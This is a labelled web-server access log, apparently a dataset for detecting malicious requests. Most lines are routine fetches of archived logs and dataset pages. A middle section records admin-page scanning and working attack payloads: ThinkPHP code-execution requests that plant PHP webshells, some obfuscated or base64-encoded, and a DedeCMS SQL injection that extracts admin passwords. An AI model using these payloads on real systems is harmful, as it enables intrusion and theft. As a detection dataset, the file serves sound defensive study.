47,1,200,0,GET /self.logs/error.log.2018-12-06.gz HTTP/1.1
31,1,404,0,GET /index.asp../1.php HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-05-28.gz HTTP/1.1
37,1,200,0,GET /self.logs/2015/?C=D;O=A HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-08-29.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-11-16.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-12-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-03-17.gz HTTP/1.1
21,1,404,0,GET /ads.txt HTTP/1.1
35,1,404,0,HEAD //plus/erraddsave.php HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-05-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-04-22.gz HTTP/1.1
48,1,304,0,GET /self.logs/access.log.2017-12-07.gz HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
31,1,404,0,HEAD /manage/login.php HTTP/1.1
29,1,404,0,HEAD /dede/login.php HTTP/1.1
32,1,404,0,HEAD /htadmin/login.php HTTP/1.1
34,1,404,0,HEAD /admindede/login.php HTTP/1.1
32,1,404,0,HEAD /manager/login.php HTTP/1.1
30,1,404,0,HEAD /admin/login.php HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-04-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-02-17.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-04-21 HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-04-22 HTTP/1.1
45,1,200,0,GET /Datasets%20Description/?C=D;O=A HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-11-25.gz HTTP/1.1
45,1,200,0,GET /Datasets%20Description/?C=M;O=A HTTP/1.1
45,1,200,0,GET /Datasets%20Description/?C=N;O=D HTTP/1.1
45,1,200,0,GET /Datasets%20Description/?C=S;O=A HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=D;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=M;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=N;O=A HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=D HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/?C=D;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/?C=N;O=A HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/?C=S;O=D HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/?C=D;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/?C=M;O=D HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/?C=N;O=A HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/?C=S;O=D HTTP/1.1
45,1,200,0,GET /Datasets%20Description/Network/ HTTP/1.1
48,1,200,0,GET /Datasets%20Description/PE_malware/ HTTP/1.1
37,1,200,0,GET /self.logs/2015/?C=M;O=A HTTP/1.1
37,1,200,0,GET /self.logs/2015/?C=N;O=D HTTP/1.1
37,1,200,0,GET /self.logs/2015/?C=S;O=A HTTP/1.1
37,1,200,0,GET /self.logs/2016/?C=D;O=A HTTP/1.1
37,1,200,0,GET /self.logs/2016/?C=M;O=A HTTP/1.1
37,1,200,0,GET /self.logs/2016/?C=N;O=D HTTP/1.1
37,1,200,0,GET /self.logs/2016/?C=S;O=A HTTP/1.1
32,1,200,0,GET /self.logs/?C=D;O=D HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=D HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.1
32,1,200,0,GET /self.logs/?C=S;O=D HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-01-19.gz HTTP/1.1
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2017-04-10.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-08-30.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-10-28.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-09-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-04-21.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-11-22.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-09-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-09-26.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-07-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-04-14.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-09-08.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-09-06.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-04-14.gz HTTP/1.1
61,1,404,0,GET /static/js/kindeditor/themes/default/default.css HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-12-03.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-06-24.gz HTTP/1.1
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-06-08.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-04-29.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-08-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-10-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-06-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-01-07.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-06-20.gz HTTP/1.1
29,1,200,0,GET /self.logs/2015/ HTTP/1.1
46,1,404,0,GET /apple-touch-icon-precomposed.png HTTP/1.1
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-11-03.gz HTTP/1.1
37,1,404,0,GET /data/admin/allowurl.txt HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-12-11.gz HTTP/1.1
30,1,404,0,GET /facai8/login.php HTTP/1.1
29,1,404,0,GET /baidu/login.php HTTP/1.1
29,1,404,0,GET /chuan/login.php HTTP/1.1
28,1,404,0,GET /kk88/login.php HTTP/1.1
31,1,404,0,GET /caiyuan/login.php HTTP/1.1
31,1,404,0,GET /dedeasd/login.php HTTP/1.1
32,1,404,0,GET /niuniu88/login.php HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-06-22.gz HTTP/1.1
63,1,200,0,GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-03-30 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-12-07.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-08-17.gz HTTP/1.1
71,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html HTTP/1.1
48,1,404,0,GET /bootstrap/img/apple-touch-icon.png HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/tunnel.html HTTP/1.1
26,1,404,0,GET /k1/login.php HTTP/1.1
29,1,404,0,GET /dede8/login.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-12-16.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-04-01.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-05-09.gz HTTP/1.1
70,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/packet_filter.html HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-05-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-01-14.gz HTTP/1.1
32,1,404,0,HEAD /dede_ht/login.php HTTP/1.1
30,1,404,0,HEAD /dede1/login.php HTTP/1.1
30,1,404,0,HEAD /dede3/login.php HTTP/1.1
33,1,404,0,HEAD /admin001/login.php HTTP/1.1
27,1,404,0,HEAD /admindede888 HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-03-22.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-10-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-05-15.gz HTTP/1.1
38,1,200,0,GET /pe_static/op-cleaver.zip HTTP/1.0
32,1,200,0,GET /pe_static/zeus.zip HTTP/1.0
32,1,200,0,GET /pe_static/apt1.zip HTTP/1.0
50,1,404,0,GET /ftp://download.iwlab.foi.se/dataset/ HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2019-12-07.gz HTTP/1.1
25,1,404,0,GET /.git//index HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-11-07.gz HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1
45,1,404,0,GET /include/calendar/calendar-cn.js HTTP/1.1
24,1,404,0,GET /js/comm.js HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-02-08.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-02-06.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-04-02.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-12-03.gz HTTP/1.1
38,1,404,0,GET /fckeditor/_whatsnew.html HTTP/1.1
24,1,200,0,GET /robots.txt HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2017-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-07-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-12-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-10-04.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-08-01.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-02-28 HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-11-20.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-10-24.gz HTTP/1.1
32,1,404,0,HEAD /public/router.php HTTP/1.1
50,1,404,0,HEAD /include/dialog/select_soft_post.php HTTP/1.1
39,1,404,0,HEAD /config/AspCms_config.asp HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-04-30.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-03-17.gz HTTP/1.1
23,1,404,0,GET /ht.access HTTP/1.1
33,1,404,0,GET //user.php?act=login HTTP/1.1
20,1,404,0,GET //d.php HTTP/1.1
29,1,404,0,POST //plus/moon.php HTTP/1.1
42,1,404,0,POST //plus/mytag_js.php?aid=9090 HTTP/1.1
100,1,404,0,GET //type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1
46,1,404,0,GET //data/cache_template/rss.tpl.php HTTP/1.1
130,3,200,1,GET //?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1
26,1,404,0,GET //robots1.php HTTP/1.1
367,5,200,0,GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\"_%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1
24,1,404,0,GET //12345.php HTTP/1.1
276,3,200,0,GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\"_\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201)_%20array(1)_%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1
25,1,404,0,GET //robots.php HTTP/1.1
235,5,200,1,GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA)_w)_base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1
20,1,404,0,GET //x.php HTTP/1.1
312,4,404,0,GET //SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1
59,1,404,0,GET //SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1
33,1,404,0,POST //index.php?s=index HTTP/1.1
172,5,404,0,GET //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64_PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1
42,1,404,0,GET //uploadfile/member/0/0x0.php HTTP/1.1
24,1,404,0,GET //index.php HTTP/1.1
25,1,404,0,GET //config.php HTTP/1.1
26,1,404,0,GET //phpinfo.php HTTP/1.1
24,1,404,0,GET //hmseo.php HTTP/1.1
51,1,404,0,POST //utility/convert/data/config.inc.php HTTP/1.1
38,1,404,0,POST //index.php?m=vod-search HTTP/1.1
20,1,404,0,GET //c.php HTTP/1.1
62,4,404,0,POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
145,4,200,1,GET //?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php'_'<?php%20@eval($_POST[hm]);?>hmseo')</php> HTTP/1.1
321,6,404,1,GET //plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1_2_3_(select%20CONCAT(0x7c_userid_0x7c_pwd)+from+`%23@__admin`%20limit+0_1)_5_6_7_8_9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1
47,1,404,0,POST //index.php/api/Uploadify/preview HTTP/1.1
25,1,404,0,POST //shell.php HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-09-11.gz HTTP/1.1
25,1,404,0,GET /app-ads.txt HTTP/1.1
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=N;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-08-07.gz HTTP/1.1
25,1,200,0,GET /favicon.ico HTTP/1.0
60,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/?C=D;O=A HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-25.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-04-26.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-04-27.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-04-28.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-01-24.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-09-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-11-29.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-11.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-08-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-03-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-04-07.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-01-21.gz HTTP/1.1
53,1,200,0,HEAD /self.logs/2015/error.log.2015-04-20.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-04-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-09-11.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-04-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-08-14.gz HTTP/1.1
54,1,200,0,HEAD /self.logs/2015/access.log.2015-02-18.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-02-18.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-07-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-07-04.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-11-15.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2018-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-01-17.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2019-09-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-09-09.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-01-29.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-10-12.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2017-03-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-03-31.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2017-01-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-25.gz HTTP/1.1
66,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/app_stats.html HTTP/1.1
63,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/notice.html HTTP/1.1
62,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/files.html HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/notice.html HTTP/1.1
48,1,404,0,GET /Datasets%20Description/Network/N/A HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1
37,1,200,0,GET /Datasets%20Description/ HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ssl.html HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/dns.html HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-02-09.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-11-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-11-28.gz HTTP/1.1
53,1,200,0,HEAD /self.logs/2015/error.log.2015-10-08.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-10-08.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-08-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-08-26.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2017-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-03-21.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-03-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-03-03.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2017-11-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-11-14.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2017-05-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-05-10.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2017-04-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-04-06.gz HTTP/1.1
47,1,304,0,GET /self.logs/error.log.2019-04-23.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2020-01-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2020-01-14.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2017-03-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-03-19.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2018-06-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-06-14.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-06-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-06-28.gz HTTP/1.1
53,1,200,0,HEAD /self.logs/2015/error.log.2015-04-15.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-04-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-12-28.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-07-06.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-04-04.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-06-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-06-18.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2018-05-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-05-06.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-12-29.gz HTTP/1.1
43,1,200,0,GET /misc/zeus_dga_domains.txt.zip HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2019-09-13 HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2019-08-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-08-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-06.gz HTTP/1.1
